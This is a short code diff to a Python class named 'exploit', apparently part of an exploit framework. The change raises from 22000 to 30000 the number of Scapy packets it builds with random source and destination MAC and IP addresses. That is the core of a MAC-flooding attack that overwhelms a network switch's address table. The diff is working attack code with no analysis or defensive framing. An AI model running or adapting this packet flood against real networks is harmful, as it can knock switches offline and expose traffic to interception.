@@ -35,7 +35,7 @@ class exploit(Sploit):
 		# Initialize list to hold all the packets
     		packet_list = []
 		# Create packets with random addresses
-    		for i in xrange(1,22000):
+    		for i in xrange(1,30000):
         		packet= Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
 	        	packet_list.append(packet)
     		return packet_list
